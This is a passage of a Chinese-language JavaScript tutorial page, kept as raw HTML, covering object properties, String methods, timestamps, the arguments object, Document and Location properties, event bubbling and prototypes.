punctuation\">)</span><span class=\"token punctuation\">;</span>  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>Object.keys(xx)&#x2F;Object.values(xx)</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Object<span class=\"token punctuation\">.</span><span class=\"token function\">keys</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Object<span class=\"token punctuation\">.</span><span class=\"token function\">values</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//输出：[\"name\", \"career\"]</span>\n<span class=\"token comment\">//输出：[ \"Poly\", \"it\"]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h4 id=\"添加属性\"><a href=\"#添加属性\" class=\"headerlink\" title=\"添加属性\"></a>添加属性</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//创建obj对象</span>\n <span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">//为对象添加动态属性</span>\n obj<span class=\"token punctuation\">.</span>userName <span class=\"token operator\">=</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span>\n obj<span class=\"token punctuation\">.</span>passWord <span class=\"token operator\">=</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">//输出</span>\n console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"删除对象属性\"><a href=\"#删除对象属性\" class=\"headerlink\" title=\"删除对象属性\"></a>删除对象属性</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//创建obj动态对象</span>\n<span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//为对象添加动态属性</span>\nobj<span class=\"token punctuation\">.</span>userName <span class=\"token operator\">=</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span>\nobj<span class=\"token punctuation\">.</span>passWord <span class=\"token operator\">=</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">;</span>    \n<span class=\"token comment\">//移除属性</span>\n<span class=\"token keyword\">delete</span> obj<span class=\"token punctuation\">.</span>passWord<span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"7、字符串\"><a href=\"#7、字符串\" class=\"headerlink\" title=\"7、字符串\"></a>7、字符串</h3><h4 id=\"String-对象中的方法\"><a href=\"#String-对象中的方法\" class=\"headerlink\" title=\"String 对象中的方法\"></a>String 对象中的方法</h4><p>下表中列举了 String 对象中提供的方法及其描述信息：</p>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>anchor()</td>\n<td>创建一个 HTML 锚点，即生成一个<code>&lt;a&gt;</code>标签，标签的 name 属性为 anchor() 方法中的参数</td>\n</tr>\n<tr>\n<td>big()</td>\n<td>用大号字体显示字符串</td>\n</tr>\n<tr>\n<td>blink()</td>\n<td>显示闪动的字符串</td>\n</tr>\n<tr>\n<td>bold()</td>\n<td>使用粗体显示字符串</td>\n</tr>\n<tr>\n<td>charAt()</td>\n<td>返回在指定位置的字符</td>\n</tr>\n<tr>\n<td>charCodeAt()</td>\n<td>返回指定字符的 Unicode 编码</td>\n</tr>\n<tr>\n<td>concat()</td>\n<td>拼接字符串</td>\n</tr>\n<tr>\n<td>fixed()</td>\n<td>以打字机文本显示字符串</td>\n</tr>\n<tr>\n<td>fontcolor()</td>\n<td>使用指定的颜色来显示字符串</td>\n</tr>\n<tr>\n<td>fontsize()</td>\n<td>使用指定的尺寸来显示字符串</td>\n</tr>\n<tr>\n<td>fromCharCode()</td>\n<td>将字符编码转换为一个字符串</td>\n</tr>\n<tr>\n<td>indexOf()</td>\n<td>检索字符串，获取给定字符串在字符串对象中首次出现的位置</td>\n</tr>\n<tr>\n<td>italics()</td>\n<td>使用斜体显示字符串</td>\n</tr>\n<tr>\n<td>lastIndexOf()</td>\n<td>获取给定字符串在字符串对象中最后出现的位置</td>\n</tr>\n<tr>\n<td>link()</td>\n<td>将字符串显示为链接</td>\n</tr>\n<tr>\n<td>localeCompare()</td>\n<td>返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串</td>\n</tr>\n<tr>\n<td>match()</td>\n<td>根据正则表达式匹配字符串中的字符</td>\n</tr>\n<tr>\n<td>replace()</td>\n<td>替换与正则表达式匹配的子字符串</td>\n</tr>\n<tr>\n<td>search()</td>\n<td>获取与正则表达式相匹配字符串首次出现的位置</td>\n</tr>\n<tr>\n<td>slice()</td>\n<td>截取字符串的片断，并将其返回</td>\n</tr>\n<tr>\n<td>small()</td>\n<td>使用小字号来显示字符串</td>\n</tr>\n<tr>\n<td>split()</td>\n<td>根据给定字符将字符串分割为字符串数组</td>\n</tr>\n<tr>\n<td>strike()</td>\n<td>使用删除线来显示字符串</td>\n</tr>\n<tr>\n<td>sub()</td>\n<td>把字符串显示为下标</td>\n</tr>\n<tr>\n<td>substr()</td>\n<td>从指定索引位置截取指定长度的字符串</td>\n</tr>\n<tr>\n<td>substring()</td>\n<td>截取字符串中两个指定的索引之间的字符</td>\n</tr>\n<tr>\n<td>sup()</td>\n<td>把字符串显示为上标</td>\n</tr>\n<tr>\n<td>toLocaleLowerCase()</td>\n<td>把字符串转换为小写</td>\n</tr>\n<tr>\n<td>toLocaleUpperCase()</td>\n<td>把字符串转换为大写</td>\n</tr>\n<tr>\n<td>toLowerCase()</td>\n<td>把字符串转换为小写</td>\n</tr>\n<tr>\n<td>toUpperCase()</td>\n<td>把字符串转换为大写</td>\n</tr>\n<tr>\n<td>toString()</td>\n<td>返回字符串</td>\n</tr>\n<tr>\n<td>valueOf()</td>\n<td>返回某个字符串对象的原始值</td>\n</tr>\n</tbody></table>\n<h4 id=\"去除字符串左右两边的空格\"><a href=\"#去除字符串左右两边的空格\" class=\"headerlink\" title=\"去除字符串左右两边的空格\"></a>去除字符串左右两边的空格</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"   123   \"</span><span class=\"token punctuation\">;</span>\nstr<span class=\"token operator\">=</span>str<span class=\"token punctuation\">.</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 123</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"8、js-时间与时间戳的转换\"><a href=\"#8、js-时间与时间戳的转换\" class=\"headerlink\" title=\"8、js 时间与时间戳的转换\"></a>8、js 时间与时间戳的转换</h3><h4 id=\"时间转时间戳：\"><a href=\"#时间转时间戳：\" class=\"headerlink\" title=\"时间转时间戳：\"></a>时间转时间戳：</h4><p>javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var timetamp4 &#x3D; Number(new Date()) <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"时间戳转时间\"><a href=\"#时间戳转时间\" class=\"headerlink\" title=\"时间戳转时间\"></a>时间戳转时间</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">function _date(number) &#123;\n  let date &#x3D; new Date(number);\n  let y &#x3D; date.getFullYear();\n  let m &#x3D; date.getMonth()+1;\n  let d &#x3D; date.getDate();\n  return (y + &quot;-&quot; + m + &quot;-&quot; + d);  \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"9、Arguments-对象\"><a href=\"#9、Arguments-对象\" class=\"headerlink\" title=\"9、Arguments 对象\"></a>9、Arguments 对象</h3><p><strong><code>arguments</code></strong> 是一个对应于传递给函数的参数的类数组对象。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">function func1(a, b, c) &#123;\n  console.log(arguments[0]);\n  &#x2F;&#x2F; expected output: 1\n\n  console.log(arguments[1]);\n  &#x2F;&#x2F; expected output: 2\n\n  console.log(arguments[2]);\n  &#x2F;&#x2F; expected output: 3\n&#125;\n\nfunc1(1, 2, 3);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"10、Document-对象\"><a href=\"#10、Document-对象\" class=\"headerlink\" title=\"10、Document 对象\"></a>10、Document 对象</h3><h4 id=\"Document-对象属性和方法\"><a href=\"#Document-对象属性和方法\" class=\"headerlink\" title=\"Document 对象属性和方法\"></a>Document 对象属性和方法</h4><p>HTML文档中可以使用以下属性和方法:</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性 &#x2F; 方法</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-activeelement.html\">document.activeElement</a></td>\n<td align=\"left\">返回当前获取焦点元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-addeventlistener.html\">document.addEventListener()</a></td>\n<td align=\"left\">向文档添加句柄</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-adoptnode.html\">document.adoptNode(node)</a></td>\n<td align=\"left\">从另外一个文档返回 adapded 节点到当前文档。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/coll-doc-anchors.html\">document.anchors</a></td>\n<td align=\"left\">返回对文档中所有 Anchor 对象的引用。</td>\n</tr>\n<tr>\n<td align=\"left\">document.applets</td>\n<td align=\"left\">返回对文档中所有 Applet 对象的引用。<strong>注意:</strong> HTML5 已不支持 <applet> 元素。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-baseuri.html\">document.baseURI</a></td>\n<td align=\"left\">返回文档的绝对基础 URI</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-body.html\">document.body</a></td>\n<td align=\"left\">返回文档的body元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-doc-close.html\">document.close()</a></td>\n<td align=\"left\">关闭用 document.open() 方法打开的输出流，并显示选定的数据。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-cookie.html\">document.cookie</a></td>\n<td align=\"left\">设置或返回与当前文档有关的所有 cookie。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-createattribute.html\">document.createAttribute()</a></td>\n<td align=\"left\">创建一个属性节点</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-createcomment.html\">document.createComment()</a></td>\n<td align=\"left\">createComment() 方法可创建注释节点。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-createdocumentfragment.html\">document.createDocumentFragment()</a></td>\n<td align=\"left\">创建空的 DocumentFragment 对象，并返回此对象。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-createelement.html\">document.createElement()</a></td>\n<td align=\"left\">创建元素节点。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-createtextnode.html\">document.createTextNode()</a></td>\n<td align=\"left\">创建文本节点。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-doctype.html\">document.doctype</a></td>\n<td align=\"left\">返回与文档相关的文档类型声明 (DTD)。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-documentelement.html\">document.documentElement</a></td>\n<td align=\"left\">返回文档的根节点</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-documentmode.html\">document.documentMode</a></td>\n<td align=\"left\">返回用于通过浏览器渲染文档的模式</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-documenturi.html\">document.documentURI</a></td>\n<td align=\"left\">设置或返回文档的位置</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-domain.html\">document.domain</a></td>\n<td align=\"left\">返回当前文档的域名。</td>\n</tr>\n<tr>\n<td align=\"left\">document.domConfig</td>\n<td align=\"left\"><strong>已废弃</strong>。返回 normalizeDocument() 被调用时所使用的配置。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/coll-doc-embeds.html\">document.embeds</a></td>\n<td align=\"left\">返回文档中所有嵌入的内容（embed）集合</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/coll-doc-forms.html\">document.forms</a></td>\n<td align=\"left\">返回对文档中所有 Form 对象引用。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-getelementsbyclassname.html\">document.getElementsByClassName()</a></td>\n<td align=\"left\">返回文档中所有指定类名的元素集合，作为 NodeList 对象。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-getelementbyid.html\">document.getElementById()</a></td>\n<td align=\"left\">返回对拥有指定 id 的第一个对象的引用。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-doc-getelementsbyname.html\">document.getElementsByName()</a></td>\n<td align=\"left\">返回带有指定名称的对象集合。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-getelementsbytagname.html\">document.getElementsByTagName()</a></td>\n<td align=\"left\">返回带有指定标签名的对象集合。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/coll-doc-images.html\">document.images</a></td>\n<td align=\"left\">返回对文档中所有 Image 对象引用。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-implementation.html\">document.implementation</a></td>\n<td align=\"left\">返回处理该文档的 DOMImplementation 对象。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-importnode.html\">document.importNode()</a></td>\n<td align=\"left\">把一个节点从另一个文档复制到该文档以便应用。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-inputencoding.html\">document.inputEncoding</a></td>\n<td align=\"left\">返回用于文档的编码方式（在解析时）。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-lastmodified.html\">document.lastModified</a></td>\n<td align=\"left\">返回文档被最后修改的日期和时间。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/coll-doc-links.html\">document.links</a></td>\n<td align=\"left\">返回对文档中所有 Area 和 Link 对象引用。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-normalize.html\">document.normalize()</a></td>\n<td align=\"left\">删除空文本节点，并连接相邻节点</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-normalizedocument.html\">document.normalizeDocument()</a></td>\n<td align=\"left\">删除空文本节点，并连接相邻节点的</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-doc-open.html\">document.open()</a></td>\n<td align=\"left\">打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-queryselector.html\">document.querySelector()</a></td>\n<td align=\"left\">返回文档中匹配指定的CSS选择器的第一元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-queryselectorall.html\">document.querySelectorAll()</a></td>\n<td align=\"left\">document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-readystate.html\">document.readyState</a></td>\n<td align=\"left\">返回文档状态 (载入中……)</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-referrer.html\">document.referrer</a></td>\n<td align=\"left\">返回载入当前文档的文档的 URL。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-removeeventlistener.html\">document.removeEventListener()</a></td>\n<td align=\"left\">移除文档中的事件句柄(由 addEventListener() 方法添加)</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-document-renamenode.html\">document.renameNode()</a></td>\n<td align=\"left\">重命名元素或者属性节点。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/coll-doc-scripts.html\">document.scripts</a></td>\n<td align=\"left\">返回页面中所有脚本的集合。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-document-stricterrorchecking.html\">document.strictErrorChecking</a></td>\n<td align=\"left\">设置或返回是否强制进行错误检查。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-title.html\">document.title</a></td>\n<td align=\"left\">返回当前文档的标题。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/prop-doc-url.html\">document.URL</a></td>\n<td align=\"left\">返回文档完整的URL</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-doc-write.html\">document.write()</a></td>\n<td align=\"left\">向文档写 HTML 表达式 或 JavaScript 代码。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/met-doc-writeln.html\">document.writeln()</a></td>\n<td align=\"left\">等同于 write() 方法，不同的是在每个表达式之后写一个换行符。</td>\n</tr>\n</tbody></table>\n<h3 id=\"11、JS中阻止冒泡事件\"><a href=\"#11、JS中阻止冒泡事件\" class=\"headerlink\" title=\"11、JS中阻止冒泡事件\"></a>11、JS中阻止冒泡事件</h3><p>冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>box<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>btn<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>按钮<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n\t<span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.btn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'按钮被点击了'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.box'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'box被点击了'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.btn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">even</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\teven<span class=\"token punctuation\">.</span><span class=\"token function\">stopPropagation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'按钮被点击了'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"12、阻止默认事件\"><a href=\"#12、阻止默认事件\" class=\"headerlink\" title=\"12、阻止默认事件\"></a>12、阻止默认事件</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;a href&#x3D;&quot;javascript:;&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;链接&lt;&#x2F;a&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;script&gt;\n        document.getElementById(&quot;link&quot;).onclick &#x3D; function ()&#123;\n            console.log(&quot;666&quot;);\n            return false;\n        &#125;\n&lt;&#x2F;script&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;script&gt;\n    document.getElementById(&quot;link&quot;).onclick &#x3D; function (e)&#123;\n        console.log(&quot;666&quot;);\n        e.preventDefault();\n    &#125;\n&lt;&#x2F;script&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"13、window-location\"><a href=\"#13、window-location\" class=\"headerlink\" title=\"13、window.location\"></a>13、window.location</h3><h4 id=\"Location-对象属性\"><a href=\"#Location-对象属性\" class=\"headerlink\" title=\"Location 对象属性\"></a>Location 对象属性</h4><table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_hash.asp\">hash</a></td>\n<td align=\"left\">设置或返回从井号 (#) 开始的 URL（锚）。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_host.asp\">host</a></td>\n<td align=\"left\">设置或返回主机名和当前 URL 的端口号。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_hostname.asp\">hostname</a></td>\n<td align=\"left\">设置或返回当前 URL 的主机名。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_href.asp\">href</a></td>\n<td align=\"left\">设置或返回完整的 URL。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_pathname.asp\">pathname</a></td>\n<td align=\"left\">设置或返回当前 URL 的路径部分。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_port.asp\">port</a></td>\n<td align=\"left\">设置或返回当前 URL 的端口号。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_protocol.asp\">protocol</a></td>\n<td align=\"left\">设置或返回当前 URL 的协议。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/prop_loc_search.asp\">search</a></td>\n<td align=\"left\">设置或返回从问号 (?) 开始的 URL（查询部分）。</td>\n</tr>\n</tbody></table>\n<h4 id=\"Location-对象方法\"><a href=\"#Location-对象方法\" class=\"headerlink\" title=\"Location 对象方法\"></a>Location 对象方法</h4><table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/met_loc_assign.asp\">assign()</a></td>\n<td align=\"left\">加载新的文档。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/met_loc_reload.asp\">reload()</a></td>\n<td align=\"left\">重新加载当前文档。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.w3school.com.cn/jsref/met_loc_replace.asp\">replace()</a></td>\n<td align=\"left\">用新的文档替换当前文档。</td>\n</tr>\n</tbody></table>\n<h3 id=\"14、原型与原型链\"><a href=\"#14、原型与原型链\" class=\"headerlink\" title=\"14、原型与原型链\"></a>14、原型与原型链</h3><h4 id=\"原型-prototype\"><a href=\"#原型-prototype\" class=\"headerlink\" title=\"原型 prototype\"></a>原型 prototype</h4><p>原型是函数特有</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">fu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n     <span class=\"token punctuation\">&#125;</span>\n     fu<span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">'kif'</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>fu<span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>挂载在原型上是为了继承(通过new)</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846409.png\" alt=\"image-20220313141218874\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846610.png\" 